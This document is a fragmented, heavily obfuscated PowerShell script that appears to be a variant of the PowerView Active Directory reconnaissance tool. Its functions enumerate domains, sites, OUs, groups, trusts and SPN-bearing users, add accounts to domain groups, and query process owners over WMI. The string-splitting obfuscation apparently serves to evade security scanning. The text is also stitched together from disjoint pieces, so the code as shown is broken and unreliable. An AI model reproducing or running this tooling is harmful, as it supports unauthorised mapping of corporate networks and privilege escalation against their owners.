        [Alias({Z3b{1}{2}{0}Z3b-fS5zlterS5z,S5zFS5z,S5ziS5z})]
        [String]
        YoV{LIJKdaPfIIJKlTIJKER},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{2}{1}{0}Z3b-fS5zthS5z,S5zaS5z,S5zADSPS5z})]
        [String]
        YoV{SEArcIJKhbaIJKSE},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{5}{1}{2}{0}{4}{3}Z3b-f S5zrS5z,S5zmaiS5z,S5znContS5z,S5zlerS5z,S5zolS5z,S5zDoS5z})]
        [String]
        YoV{sErVIJKER},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zBasS5z,S5zeS5z}, {Z3b{2}{1}{0}Z3b -f S5zlS5z,S5zeS5z,S5zOneLevS5z}, {Z3b{0}{1}Z3b -fS5zSubtreS5z,S5zeS5z})]
        [String]
        YoV{seIJKARIJKcHIJKscope} = (Z3b{0}{1}Z3b-f S5zSubtrS5z,S5zeeS5z),

        [ValidateRange(1, 10000)]
        [Int]
        YoV{RESULIJKTIJKPIJKAGEsiZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        YoV{sEIJKRVEIJKRIJKTimeIJKliMiT},

        [Switch]
        YoV{TIJKOmbStOIJKNE},

        [ValidateSet({Z3b{0}{1}Z3b -f S5zJoS5z,S5zhnS5z}, {Z3b{0}{2}{1}Z3b -f S5zHasS5z,S5zatS5z,S5zhcS5z})]
        [Alias({Z3b{1}{0}Z3b -f S5zmatS5z,S5zForS5z})]
        [String]
        YoV{OuIJKTpuTfoRIJKMAT} = (Z3b{1}{0}{2}Z3b -fS5zasS5z,S5zHS5z,S5zhcatS5z),

        [Management.Automation.PSCredential','rMIJKiSsIONs}[YoV{_}]
                                YoV{fIJKsR} = YoV{FIJKsR} -band (-not YoV{_})
                              }
                            }

            
            YoV{PIJKeRmISsIJKioIJKNs} += YoV{aIJKCCeSSIJKmaSk}.Z3bKEIJKYSZ3b JGO &(Z3b{2}{1}{0}{3}Z3b -fS5zjeS5z,S5ze-ObS5z,S5zWherS5z,S5zctS5z) { YoV{FIJKSR} -band YoV{_} } JGO &(Z3b{3}{0}{1}{2}Z3b -f S5zaS5z,S5zch-ObjS5z,S5zectS5z,S5zForES5z) { YoV{AIJKccEIJKSSMIJKAsk}[YoV{_}] }
            (YoV{pIJKeRIJKmiSSiIJKoNs} JGO &(Z3b{1}{0}{2}{3}Z3b-fS5zeS5z,S5zWhS5z,S5zrS5z,S5ze-ObjectS5z) {YoV{_}}) -join S5z,S5z
        }

        YoV{CONvIJKeRtaRIJKgumIJKeNTS} = @{}
        if (YoV{PsbIJKOuNDPIJKAramIJKetIJKeRS}[(Z3b{1}{0}{2}Z3b -fS5ztiaS5z,S5zCredenS5z,S5zlS5z)]) { YoV{cOnvErtaRGIJKUMIJKEIJKNIJKTS}[(Z3b{1}{0}{2}{3}Z3b-f S5zeS5z,S5zCrS5z,S5zdeS5z,S5zntialS5z)] = YoV{CREIJKdIJKeNIJKTIAl} }

        YoV{MApPEDcIJKOMpUtIJKeRs} = @{}
    }

    PROCESS {
        ForEach (YoV{targEtIJKPAIJKTh} in YoV{PaIJKTh}) {
            try {
                if ((YoV{tIJKARGETPaIJKTH} -Match (((Z3b{1}{4}{0}{6}{3}{5}{2}Z3b -f S5zJWOJW.S5z,S5zOJS5z,S5z.*S5z,S5zJWS5z,S5zWOJWOS5z,S5zOJWS5z','.Invoke()
        }
    }
}


function Get-DOmIJKAIJKIn {


    [OutputType([System.DirectoryServices.ActiveDirectory.Domain])]
    [CmdletBinding()]
    Param(
        [Parameter(pOSITiON = 0, VAlUefrOmpIPElinE = YoV{TIJKRUE})]
        [ValidateNotNullOrEmpty()]
        [String]
        YoV{dIJKomIJKAIN},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKReDIJKEnTiaL} =   (  &(Z3b{0}{1}Z3b -f S5zITS5z,S5zemS5z)  (Z3bvArZ3b+Z3bIabZ3b+Z3ble:jfIZ3b)).Z3bvaIJKLUeZ3b::Z3bEIJKmPTYZ3b
    )

    PROCESS {
        if (YoV{psIJKBIJKOUndpaRAMeIJKTErS}[(Z3b{2}{1}{0}Z3b -f S5zlS5z,S5zentiaS5z,S5zCredS5z)]) {

            &(Z3b{1}{0}{4}{2}{3}Z3b -fS5zriteS5z,S5zWS5z,S5zoS5z,S5zseS5z,S5z-VerbS5z) (Z3b{9}{12}{14}{4}{3}{8}{6}{0}{10}{7}{13}{15}{5}{1}{2}{11}{16}Z3b -f S5zlterS5z,S5zetS5z,S5z-DomaS5z,S5znS5z,S5zDomaiS5z,S5z GS5z,S5zaS5z,S5zredeS5z,S5z] Using S5z,S5z[GeS5z,S5znate cS5z,S5ziS5z,S5ztS5z,S5zntialS',' 1 (Z3b{1}{2}{0}Z3b -fS5ze[]S5z,S5zByS5z,S5ztS5z) -MarshalAs @((Z3b{1}{2}{0}Z3b-f S5zyS5z,S5zByVS5z,S5zalArraS5z), 20)
}


YoV{sHarEIJK_IJKINIJKFo_1} = &(Z3b{1}{0}Z3b-f S5zctS5z,S5zstruS5z) YoV{MIJKoD} (Z3b{2}{1}{0}{3}Z3b -f S5zw.ShaS5z,S5zrVieS5z,S5zPoweS5z,S5zreInfoS5z) @{
    (Z3b{0}{1}Z3b -fS5zNS5z,S5zameS5z) = &(Z3b{1}{0}Z3b -fS5zieldS5z,S5zfS5z) 0 (Z3b{2}{0}{1}Z3b -fS5zrinS5z,S5zgS5z,S5zStS5z) -MarshalAs @((Z3b{2}{1}{0}Z3b-f S5ztrS5z,S5zSS5z,S5zLPWS5z))
    (Z3b{1}{0}Z3b-f S5zeS5z,S5zTypS5z) = &(Z3b{1}{0}Z3b-fS5zeldS5z,S5zfiS5z) 1 (Z3b{1}{0}Z3b-f S5zt32S5z,S5zUInS5z)
    (Z3b{0}{1}Z3b -f S5zRS5z,S5zemarkS5z) = &(Z3b{1}{0}Z3b-f S5zeldS5z,S5zfiS5z) 2 (Z3b{0}{1}Z3b-f S5zStrinS5z,S5zgS5z) -MarshalAs @((Z3b{0}{1}Z3b -fS5zLS5z,S5zPWStrS5z))
}


YoV{WIJKkStaIJK_UsEr_IJKiNfIJKo_1} = &(Z3b{0}{1}Z3b -f S5zstrucS5z,S5ztS5z) YoV{mIJKoD} (Z3b{6}{7}{0}{3}{5}{1}{4}{2}Z3b -fS5z.LogS5z,S5zUS5z,S5zrInfoS5z,S5zgeS5z,S5zseS5z,S5zdOnS5z,S5zPowerVieS5z,S5zwS5z) @{
    (Z3b{0}{1}{2}Z3b-f S5zUseS5z,S5zrNS5z,S5zameS5z) = &(Z3b{0}{1}Z3b -fS5zfielS5z,S5zdS5z) 0 (Z3b{1}{0}Z3b -f S5zingS5z,S5zStrS5z) -MarshalAs @((Z3b{0}{1}{2}Z3b-fS5zLS5z,S5zPWS5z,S5zStrS5z))
    (Z3b{3}{1}{2}{0}Z3b-fS5znS5z,S5znS5z,S5zDomaiS5z,S5zLogoS5z) = &(Z3b{0}{1}Z3b-f S5zfielS5z,S5zdS5z) 1 (Z3b{1}{2}{0}Z3b -fS5zringS5z,S5zSS5z,S5ztS5z) -MarshalAs @((Z3b{0}{1}{2}Z3b-f S5zLPS5z,S5zWSS5z,S5ztrS5z))
    (Z3b{1}{2}{0}Z3b-f S5zthDomainsS5z,S5zAS5z,S5zuS5z) = &(Z3b{1}{0}Z3b-fS5zldS5z,S5zfieS5z) 2 (Z3b{1}{2}{0}Z3b-f S5zgS5z,S5zStS5z,S5zrinS5z) -MarshalAs @((Z3b{0}{1}Z3b-f S5zLPWSS5z,S5ztrS5z))
    (Z3b{0}{1}{2}{3}Z3b-fS5zLS5z,S5zogoS5z,S5znServS5z,S5zerS5z) = &(Z3b{0}{1}Z3b-fS5zfielS5z,S5zdS5z) 3 (Z3b{1}{0}Z3b-f S5zingS5z,S5zStrS5z) -MarshalAs @((Z3b{0}{1}Z3b-f S5zLPWSS5z,S5ztrS5z))
}


YoV{SIJKESIJKsIoIJKN_InfoIJK_10} = &(Z3b{0}{1}Z3b-f S5zstruS5z,S5zctS5z) YoV{mIJKoD} (Z3b{1}{2}{0}{3}{4}Z3b-fS5zssiS5z,S5zPowerVS5z,S5ziew.SeS5z,S5zoS5z,S5znInfoS5z) @{
    (Z3b{0}{1}Z3b-fS5zCNamS5z,S5zeS5z) = &(Z3b{0}{1}Z3b -fS5zfiS5z,S5zeldS5z) 0 (Z3b{0}{1}{2}Z3b-fS5zSS5z,S5ztrS5z,S5zingS5z) -MarshalAs @((Z3b{0}{1}Z3b-f S5zLS5z,S5zPWStrS5z))
    (Z3b{2}{0}{1}Z3b-f S5zseS5z,S5zrNameS5z,S5zUS5z) = &(Z3b{1}{0}Z3b-fS5zieldS5z,S5zfS5z) 1 (Z3b{1}{0}Z3b-fS5zngS5z,S5zStriS5z) -MarshalAs @((Z3b{1}{0}Z3b-fS5zPWStrS5z,S5zLS5z))
    (Z3b{0}{1}Z3b -f S5zTiS5z,S5zmeS5z) = &(Z3b{0}{1}Z3b-fS5zfS5z,S5zieldS5z) 2 (Z3b{0}{1}{2}Z3b-f S5zUS5z,S5zInt3S5z,S5z2S5z)
    (Z3b{1}{0}{2}Z3b -fS5zTiS5z,S5zIdleS5z,S5zmeS5z) = &(Z3b{1}{0}Z3b-f S5zieldS5z,S5zfS5z) 3 (Z3b{0}{1}Z3b-f S5zUInS5z,S5zt32S5z)
}


YoV{SIIJKDIJK_IJKNAmIJKe_Use} = &(Z3b{2}{1}{0}Z3b-f S5zmS5z,S5zuS5z,S5zpsenS5z) YoV{mIJKod} (Z3b{2}{1}{0}Z3b-f S5zSES5z,S5zUS5z,S5zSID_NAME_S5z) (Z3b{1}{0}Z3b-fS5z16S5z,S5zUIntS5z) @{
    (Z3b{0}{1}{2}Z3b-f S5zSidS5z,S5zTyS5z,S5zpeUserS5z)             = 1
    (Z3b{0}{2}{1}Z3b -f S5zSiS5z,S5zupS5z,S5zdTypeGroS5z)            = 2
    (Z3b{0}{1}{2}Z3b-f S5zSiS5z,S5zdTypS5z,S5zeDomainS5z)           = 3
    (Z3b{1}{2}{3}{0}Z3b -fS5zsS5z,S5zSidTypeAlS5z,S5ziS5z,S5zaS5z)            = 4
    (Z3b{1}{3}{5}{0}{4}{2}{6}Z3b-f S5zWeS5z,S5zSiS5z,S5zouS5z,S5zdTyS5z,S5zllKnownGrS5z,S5zpeS5z,S5zpS5z)   = 5
    (Z3b{0}{1}{4}{2}{3}Z3b-fS5zSidTypeDeS5z,S5zleteS5z,S5zAS5z,S5zccountS5z,S5zdS5z)   = 6
    (Z3b{3}{0}{2}{1}Z3b -f S5ziS5z,S5zidS5z,S5zdTypeInvalS5z,S5zSS5z)          = 7
    (Z3b{3}{4}{0}{1}{2}Z3b-f S5zdTypS5z,S5zeUnkS5z,S5znownS5z,S5zSS5z,S5ziS5z)          = 8
    (Z3b{1}{0}{2}{3}Z3b-f S5zidTypeCoS5z,S5zSS5z,S5zmS5z,S5zputerS5z)         = 9
}


YoV{lOcIJKAIJKlgrOup_InIJKFO_1} = &(Z3b{0}{1}Z3b-fS5zstrucS5z,S5ztS5z) YoV{MIJKOd} (Z3b{2}{0}{3}{1}Z3b-f S5zCALGROUP_INFS5z,S5z1S5z,S5zLOS5z,S5zO_S5z) @{
    (Z3b{0}{2}{1}{3}Z3b-fS5zlgS5z,S5z1_namS5z,S5zrpiS5z,S5zeS5z) = &(Z3b{0}{1}Z3b -fS5zfiS5z,S5zeldS5z) 0 (Z3b{0}{1}Z3b-f S5zStS5z,S5zringS5z) -MarshalAs @((Z3b{0}{1}Z3b -f S5zLS5z,S5z','accS5z)
        }
        else {
            YoV{gIJKROUpSIJKearIJKcheRaRGumeNTS} = @{
','{pSIJKBIJKoundIJKPArIJKAMIJKeteRs}[(Z3b{0}{1}Z3b-f S5zSS5z,S5zerverS5z)]) { YoV{ArIJKGUmEIJKNts}[(Z3b{1}{0}Z3b-fS5zrverS5z,S5zSeS5z)] = YoV{SeIJKRVIJKeR} }

            
            YoV{aIJKRgIJKUMENTS}[(Z3b{1}{2}{0}Z3b-fS5zrS5z,S5zLDAS5z,S5zPFilteS5z)] = ((Z3b{12}{13}{6}{1}{4}{14}{3}{10}{11}{0}{9}{2}{8}{5}{7}Z3b -fS5z1S5z,S5zCS5z,S5z5S5z,S5z1.S5z,S5zontroS5z,S5z4S5z,S5zntS5z,S5z.803:=8192)S5z,S5z56.1.S5z,S5z3S5z,S5z2.840S5z,S5z.1S5z,S5z(userAcS5z,S5zcouS5z,S5zl:S5z))

            &(Z3b{3}{4}{0}{2}{1}Z3b -f S5znComS5z,S5zuterS5z,S5zpS5z,S5zGet-S5z,S5zDomaiS5z) @Arguments
        }
        else {
            YoV{fouNDdIJKOMIJKAIJKIN} = &(Z3b{0}{1}{3}{2}Z3b -f S5zGeS5z,S5zt-S5z,S5zainS5z,S5zDomS5z) @Arguments
            if (YoV{FOUnDIJKDIJKOIJKMaIN}) {
                YoV{FoUndIJKdOmIJKAIJKin}.Z3bDoMIJKAIJKiNcoNTIJKROllIJKerSZ3b
       ','5z})]
        [String]
        YoV{IDENIJKTIIJKTy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{DoIJKMain},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{CIJKREdEIJKNtIJKIal} =   (  &(Z3b{2}{1}{3}{0}Z3b -f S5ziabLES5z,S5z-vAS5z,S5zgeTS5z,S5zRS5z)  JFi  ).','iDEnTIJKITy},

        [ValidateNotNullOrEmpty()]
        [String]
        YoV{TArgEIJKTdOMaIJKin},

        [ValidateNotNullOrEmpty()]
        [Alias({Z3b{0}{1}Z3b-fS5zFilteS5z,S5zrS5z}',']
        [Management.Automation.CredentialAttribute()]
        YoV{cREDIJKentIJKiAl} =  (  &(Z3b{1}{0}Z3b -fS5zaBLeS5z,S5zVArIS5z)  (Z3bJZ3b+Z3bFIZ3b)).Z3bVIJKAlUEZ3b::Z3beIJKmpTyZ3b
    )

    BEGIN {
        YoV{UsIJKERsearcHIJKeRaIJKRgIJKUmENts} = @{
            S5zSPNS5z = YoV{TrIJKUE}
            (Z3b{0}{1}{2}{3}Z3b -fS5zPrS5z,S5zopertS5z,S','(YoV{MEIJKMIJKBER} in YoV{MemIJKBEIJKRs}) {
                if (YoV{MIJKEMIJKBER} -match (((Z3b{0}{1}{2}Z3b-fS5z.+5S5z,S5zyH5yH.S5z,S5z+S5z)).Z3bRIJKePLIJKAcEZ3b(S5z5yHS5z,[STrInG][Char]92))) {
                    YoV{CONtEXtIJKAIJKRIJKGuIJKmenIJKTS}[(Z3b{0}{1}{2}Z3b -f S5zIdenS5z,S5ztitS5z,S5zyS5z)] = YoV{MeIJKmbIJKer}
                    YoV{UseRcIJKONtIJKExT} = &(Z3b{1}{0}{2}{3}Z3b -f S5zet-PrincipaS5z,S5zGS5z,S5zlS5z,S5zContextS5z) @ContextArguments
                    if (YoV{uIJKSERcoIJKNtIJKeXt}) {
                        YoV{UseriIJKDIJKenTIJKItY} = YoV{usIJKERcIJKONtEXT}.Z3bIdeIJKNtIJKiTYZ3b
                    }
                }
                else {
                    YoV{usIJKeRcOIJKNtIJKexT} = YoV{gIJKRIJKOUPIJKcONTeIJKXT}
                    YoV{uSIJKEIJKRiDENTiIJKTy} = YoV{mEmIJKBIJKeR}
                }
                &(Z3b{2}{1}{0}Z3b -f S5zite-VerboseS5z,S5zrS5z,S5zWS5z) (S5z[S5z+S5zAdd-DoS5z+S5zmainGrS5z+S5zouS5z+S5zpMemS5z+S5zbS5z+S5zer] S5z+S5zAddinS5z+S5zg S5z+S5zmS5z+S5zember S5z+Z3bS5zYoVMemberS5z Z3b+S5ztoS5z+S5z S5z+S5zgroS5z+S5zup S5z+Z3bS5zYoVIdentityS5zZ3b)
                YoV{MEIJKMbIJKeR} = [System.DirectoryServices.AccountManagement.Principal]::(Z3b{4}{2}{1}{0}{3}Z3b -f S5ztS5z,S5ziS5z,S5zByIdentS5z,S5zyS5z,S5zFindS5z).I',' }
            }
            if (YoV{IDEnTiTyfIJKiIJKlIJKTER} -and (YoV{IDEIJKNTItyFIJKIIJKlTEr}.(Z3b{1}{0}Z3b-fS5zimS5z,S5zTrS5z).Invoke() -ne S5zS5z) ) {
                YoV{FIJKIIJKLter} += Z3b(JGOYoVIdentityFilter)Z3b
            }

            if (YoV{psbIJKOIJKUNdparameIJKTIJKEIJKRs}[(Z3b{0}{1}{2}Z3b -fS5zGS5z,S5zPLinS5z,S5zkS5z)]) {
                &(Z3b{0}{3}{2}{1}Z3b -f S5zWritS5z,S5zoseS5z,S5zbS5z,S5ze-VerS5z) (S5z[Get-DoS5z+S5zmaS5z+S5zinSite]S5z+S5z S5z+S5zSeaS5z+S5zrS5z+S5zcS5z+S5zhing S5z+S5zfoS5z+S5zr S5z+S5zsS5z+S5zitesS5z+S5z S5z+S5zwiS5z+S5zth S5z+Z3bYoVGPLink Z3b+S5zsS5z+S5zet S5z+S5ziS5z+S5zn S5z+S5ztheS5z+S5z S5z+S5zgpS5z+S5zLink S5z+S5zpropS5z+S5zeS5z+S5zrtyS5z)
                YoV{fIJKIlTIJKEr} += Z3b(gplink=*YoVGPLink*)Z3b
            }

            if (YoV{PSbIJKOUNDpIJKArIJKAIJKmIJKetERs}[(Z3b{1}{0}{2}Z3b -fS5ztS5z,S5zLDAPFilS5z,S5zerS5z)]) {
                &(Z3b{4}{2}{0}{3}{1}Z3b-fS5zite-VerS5z,S5zoseS5z,S5zrS5z,S5zbS5z,S5zWS5z) (S5z[S5z+S5zGet-S5z+S5zDomainSS5z+S5zite] S5z+S5zUsinS5z+S5zg S5z+S5zaS5z+S5zdditionaS5z+S5zl S5z+S5zLS5z+S5zDAP S5z+S5zfiS5z+S5zlterS5z+S5z: S5z+Z3bYoVLDAPFilterZ3b)
                YoV{fIJKIIJKLtER} += Z3bYoVLDAPFilterZ3b
            }

            YoV{SitEseaIJKRcIJKheR}.Z3bFilIJKTERZ3b = Z3b(&(objectCategory=site)YoVFilter)Z3b
            &(Z3b{1}{2}{0}Z3b -fS5zoseS5z,S5zWriteS5z,S5z-VerbS5z) Z3b[Get-DomainSite] Get-DomainSite filter string: YoV(YoVSiteSearcher.filter) Z3b

            if (YoV{PIJKSbouNdIJKpARAmeTIJKEIJKRS}[(Z3b{0}{1}Z3b -fS5zFindOS5z,S5zneS5z)]) { YoV{REsIJKUlIJKTs} = YoV{sIJKIIJKTEIJKseArIJKcHEr}.(Z3b{1}{0}{2}Z3b-f S5zindAS5','3b{0}{1}Z3b-f S5zsplS5z,S5zitS5z).Invoke(S5z5rjS5z)[2]
                    }
                }
            }

            YoV{SIJKeIJKRvERs}
        }

        function gETIJK-IJKdOMaIJKIIJKNDfssIJKHarEv1 {
            [CmdletBinding()]
            Param(
                [String]
                YoV{domAIJKIn},

                [String]
                YoV{SEIJKARchBAIJKse},

                [String]
           ','
            }

            YoV{oUsIJKEaRIJKchER}.Z3bfIJKILteRZ3b = Z3b(&(objectCategory=organizationalUnit)YoVFilter)Z3b
            &(Z3b{0}{1}{2}Z3b -fS5zWS5z,S5zrite-VerbS5z,S5zoseS5z) Z3b[Get-DomainOU] Get-DomainOU filter string: YoV(YoVOUSearcher.filter) Z3b','z,S5ze:1.2.840.11S5z,S5z.S5z,S5zupTyS5z,S5z=1S5z,S5z(groS5z,S5z803:S5z)) }
                        (Z3b{2}{0}{1}{3}{4}Z3b -fS5zreS5z,S5zatedBySS5z,S5zNotCS5z,S5zysteS5z,S5zmS5z)    { (((Z3b{1}{3}{4}{2}{5}{6}{0}Z3b -fS5z03:=1))S5z,S5z(S5z,S5z8S5z,S5z!(groupS5z,S5zType:1.2.S5z,S5z40.113556.1S5z,S5z.4.8S5z))) }
                    }
                    &(Z3b{3}{2}{1}{0}Z3b -fS5zseS5z,S5zboS5z,S5zVerS5z,S5zWrite-S5z) (S5z[Get-DS5z+S5zomaiS5z+S5znS5z+S5zGS5z+S5zroup] S5z+S5zSS5z+S5zearchS5z+S5zing S5z+S5zfS5z+S5zor S5z+S5zgroS5z+S5zup S5z+S5zproS5z+S5zperS5z+S5zty S5z+Z3bS5zYoVGroupPropertyValueS5zZ3b)
                }
                if (YoV{PSBIJKoIJKUNIJKDIJKpARaMeTERS}[(Z3b{2}{1}{0}Z3b-f S5zrS5z,S5zAPFilteS5z,S5zLDS5z)]) {
                    &(Z3b{2}{1}{0}Z3b-fS5zte-VerboseS5z,S5zriS5z,S5zWS5z) (S5z[S5z+S5zGetS5z+S5z-DomainGroS5z+S5zup]S5z+S5z S5z+S5zUsingS5z+S5z S5z+S5zaS5z+S5zddiS5z+S5ztionaS5z+S5zl S5z+S5zLS5z+S5zDAP S5z+S5zfilteS5z+S5zr: S5z+Z3bYoVLDAPFilterZ3b)
                    YoV{fIIJKlter} += Z3bYoVLDAPFilterZ3b
                }

                YoV{gIJKRoUIJKpsIJKEarCHEr}.Z3bfIJKiLTIJKErZ3b = Z3b(&(objectCategory=group)YoVFilter)Z3b
                &(Z3b{0}{2}{1}Z3b -f S5zWriS5z,S5zrboseS5z,S5zte-VeS5z) Z3b[Get-DomainGroup] filter string: YoV(YoVGroupSearcher.filter) Z3b

                if (YoV{PsBoIJKUIJKNdPArAIJKMeTEIJKRS}[(Z3b{0}{1}{2}Z3b-fS5zFiS5z,S5znS5z,S5zdOneS5z)]) { YoV{REsIJKUIJKLtS} = YoV{grOuIJKpsearCIJKHIJKeR}.(Z3b{1}{0}Z3b -fS5zeS5z,S5zFindOnS5z).Invoke() }
                else { YoV{ReSIJKUltS} = YoV{groUIJKPsIJKEaIJKRchIJKer}.(Z3b{1}{2}{0}Z3b -fS5zlS5z,S5zFindS5z,S5zAlS5z).Invoke() }
                YoV{ReSIJKUlIJKTS} JGO &(Z3b{1}{2}{0}Z3b-fS5ze-ObjectS5z,S5zWS5z,S5zherS5z) {YoV{_}} JGO &(Z3b{3}{2}{1}{0}Z3b-fS5zctS5z,S5zEach-ObjeS5z','CTZ3b.Z3bTYPenAIJKmESZ3b.(Z3b{1}{0}Z3b-f S5zsertS5z,S5zInS5z).Invoke(0, (Z3b{0}{4}{5}{3}{6}{7}{1}{2}Z3b -f S5zPoS5z,S5zLDS5z,S5zAPS5z,S5zDomainS5z,S5zwerVS5z,S5ziew.S5z,S5zTrusS5z,S5zt.S5z))
                    YoV{domIJKAIJKInTruST}
                }
                if (YoV{REIJKSULts}) {
                    try { YoV{rEsUlIJKTS}.(Z3b{2}{1}{0}Z3b-f S5zeS5z,S5zsposS5z,S5zdiS5z).Invoke() }
                    catch {
                        &(Z3b{3}{2}{4}{1}{0}Z3b -f S5zseS5z,S5zerboS5z,S5zite-S5z,S5zWrS5z,S5zVS5z) (S5z[Get-S5z+S5zDomainTrS5z+S5zustS5z+S5z]S5z+S5z S5z+S5zErrS5z+S5zor S5z+S5zdisS5z+S5zpoS5z+S5zsingS5z+S5z S5z+S5zoS5z+S5zf S5z+S5ztheS5z+S5z S5z+S5zResultsS5z+S5z S5z+S5zobS5z+S5zject:S5z+S5z S5z+Z3bYoV_Z3b)
                    }
                }
                YoV{trUStIJKSEarIJKCIJKhIJKer}.(Z3b{1}{0}Z3b-fS5zseS5z,S5zdispoS5z).Invoke()
            }
        }
        elseif (YoV{pSCIJKMdLIJKet}.pARameteRSETNAME -eq S5zAPIS5z) {
            
            if (YoV{pIJKsboUnDpArAMIJKEtEIJKRS}[(Z3b{0}{1}{2}Z3b-fS5zSerS5z,S5zvS5z,S5zerS5z)]) {
                Yo','Z3b
                        YoV{gIJKpOIJKLoCAIJKlGroupIJKMIJKApIJKpInG} JGO &(Z3b{0}{1}','z,S5znesS5z,S5zyS5z,S5zWedS5z) = &(Z3b{4}{3}{1}{0}{2}Z3b-fS5zrS5z,S5zonHouS5z,S5zsArrayS5z,S5zgS5z,S5zConvertTo-LoS5z) -HoursArr YoV{LIJKoIJKGOIJKNIJKhOurSarrAy}[9..11]
            (Z3b{1}{0}Z3b -fS5zhursS5z,S5zTS5z) = &(Z3b{5}{0}{6}{2}{4}{1}{3}Z3b-f S5znvertS5z,S5zursArrS5z,S5zo-LogS5z,S5zayS5z,S5zonHoS5z,S5zCoS5z,S5zTS5z) -HoursArr YoV{loIJKgOIJKNIJKHOURSaRRaY}[12..14]
            (Z3b{0}{1}Z3b-f S5zFridaS5z,S5zyS5z) = &(Z3b{6}{3}{0}{2}{5}{4}{1}Z3b -fS5zrS5z,S5zrsArrayS5z,S5ztS5z,S5zonveS5z,S5zuS5z,S5zTo-LogonHoS5z,S5zCS5z) -HoursArr YoV{logoIJKNHOuIJKRSaRrIJKAY}[15..17]
            (Z3b{2}{0}{1}Z3b -fS5zturS5z,S5zdayS5z,S5zSaS5z) = &(Z3b{5}{2}{0}{3}{4}{1}{6}Z3b-fS5zvS5z,S5zLogonHouS5z,S5zonS5z,S5zertTS5z,S5zo-S5z,S5zCS5z,S5zrsArrayS5z) -HoursArr YoV{LIJKOIJKgIJKoNhOURSARRAy}[18..20]
        }

        YoV{OuTIJKpIJKUt} = &(Z3b{1}{0}{2}Z3b-f S5zew-ObjeS5z,S5zNS5z,S5zctS5z) (Z3b{2}{0}{1}Z3b -f S5zbS5z,S5zjectS5z,S5zPSOS5z) -Property YoV{OUIJKTpIJKUT}
        YoV{OIJKUIJKTPUt}.Z3bPsOIJKBjEIJKCTZ3b.Z3btYPeNaIJKmesZ3b.(Z3b{0}{1}Z3b-fS5zInsS5z,S5zertS5z).Invoke(0, (Z3b{0}{5}{1}{4}{2}{6}{3}Z3b -f S5zPowerVS5z,S','           }
            else {
                YoV{TARIJKGEtIJKFoREST} = &(Z3b{1}{3}{0}{2}Z3b -fS5zoS5z,S5zGeS5z,S5zmainS5z,S5zt-DS5z) -Domain YoV{dOmIJKAIn} -Credential YoV{cRedIJKeIJKNTiAl} JGO &(Z3b{2}{3}{1}{4}{0}Z3b-fS5zObjectS5z,S5zctS5z,S5zSS5z,S5zeleS5z,S5z-S5z) -ExpandProperty (Z3b{1}{0}Z3b-fS5zorestS5z,S5zFS5z) JGO &(Z3b{2}{0}{1}Z3b -fS5zlS5z,S5zect-ObjectS5z,S5zSeS5z) -ExpandProperty (Z3b{1}{0}Z3b -fS5zeS5z,S5zNamS5z)
            }
            &(Z3b{0}{2}{1}Z3b-f S5zWriS5z,S5z-VerboseS5z,S5zteS5z) (S5z[FiS5z+S5znd-DomS5z+S5zainS5z+S5zObjectS5z+S5zPS5z+S5zropertyOutS5z+S5zlier] S5z+S5zE','ssS5z,S5zldPrS5z,S5zShouS5z}, S5zS5z)]
    [CmdletBinding()]
    Param (
        [Parameter(PoSiTIOn = 0, vAlUefRompiPelINE = YoV{tRIJKUe}, valUEFROmPipElINEbyPropErTYNAmE = YoV{TrIJKUe})]
        [Alias({Z3b{0}{2}{1}{3}{4}Z3b -f S5zDistingS5z,S5zeS5z,S5zuishS5z,S5zdNaS5z,S5zmeS5z}, {Z3b{3}{2}{1}{0}Z3b -fS5ztNameS5z,S5zounS5z,S5zamAccS5z,S5zSS5z}, {Z3b{0}{1}Z3b-fS5zNamS5z,S5zeS5z})]
        [String[]]
        YoV{tIJKAIJKRGET','[Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        YoV{crEDIJKeIJKNTIAl} =   ( &(Z3b{0}{1}{2}Z3b-fS5zgS5z,S5zEt-vS5z,S5zAriaBLES5z)  (S5zjFS5z+S5ziS5z) -valUeonlY)::Z3bEmIJKPTYZ3b
    )

    PROCESS {
        ForEach (YoV{COMputIJKeR} in YoV{coMpUIJKTErIJKNIJKAMe}) {
            try {
                YoV{wIJKMiIJKArGIJKUIJKmENtS} = @{
                    (Z3b{3}{0}{1}{2}Z3b -fS5zputerNaS5z,S5zmS5z,S5zeS5z,S5zComS5z) = YoV{CoIJKmPIJKUteRIJKNAIJKme}
                    (Z3b{0}{1}Z3b-fS5zClS5z,S5zassS5z) = (Z3b{1}{2}{0}{3}Z3b-f S5zprS5z,S5zWiS5z,S5zn32_S5z,S5zocessS5z)
                }
                if (YoV{PsIJKBOuIJKNDpaRAmEIJKTErs}[(Z3b{2}{1}{0}Z3b-fS5zialS5z,S5zntS5z,S5zCredeS5z)]) { YoV{wmiIJKARgUmEIJKNIJKTS}[(Z3b{1}{0}{2}Z3b-f S5zedS5z,S5zCrS5z,S5zentialS5z)] = YoV{CIJKRIJKEdEIJKNtIAl} }
                &(Z3b{2}{0}{3}{1}Z3b -fS5ztS5z,S5zobjectS5z,S5zGeS5z,S5z-WMIS5z) @WmiArguments JGO &(Z3b{1}{0}{4}{2}{3}Z3b-fS5zrEach-OS5z,S5zFoS5z,S5zcS5z,S5ztS5z,S5zbjeS5z) {
                    YoV{OWIJKNer} = YoV{_}.(Z3b{0}{1}Z3b -f S5zgetowS5z,S5znerS5z).Invoke();
                    YoV{pIJKRoIJKCeSS} = &(Z3b{2}{0}{1}Z3b-f S5zjeS5z,S5zctS5z,S5zNew-ObS5z) (Z3b{0}{2}{1}Z3b -f S5zPSS5z,S5zctS5z,S5zObjeS5z)
                    YoV{PrIJKOcEIJKSS} JGO &(Z3b{2}{1}{0}Z3b-f S5zmberS5z,S5zeS5z,S5zAdd-MS5z) (Z3b{0}{2}{1}{3}Z3b-fS5zNS5z,S5zprS5z,S5zoteS5z,S5zopertyS5z) (Z3b{1}{2}{3}{0}Z3b-f S5zmeS5z,S5zComputS5z,S5zerNS5z,S5zaS5z) YoV{CIJKOMPUIJKTer}
